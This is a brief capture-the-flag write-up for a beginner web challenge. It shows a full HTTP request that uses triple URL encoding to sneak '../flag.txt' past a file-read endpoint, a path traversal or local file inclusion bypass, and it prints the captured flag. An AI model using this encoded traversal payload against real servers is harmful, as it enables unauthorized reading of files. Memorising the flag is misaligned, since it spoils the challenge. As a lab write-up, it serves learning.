# Beginner/secret_of_j4ck4l

I left a message for you. You will love it definitely

http://34.132.132.69:8003/

Downloads: [public.zip](./public.zip)

## Solution

Triple bypass using URL encode.

```http
GET /read_secret_message?file=%25252E%25252E%25252Fflag%25252Etxt HTTP/1.1
Host: 34.132.132.69:8003
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.123 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close


```

## Flag

```plaintext
flag{s1mp13_l0c4l_f1l3_1nclus10n_0dg4af52gav}
```
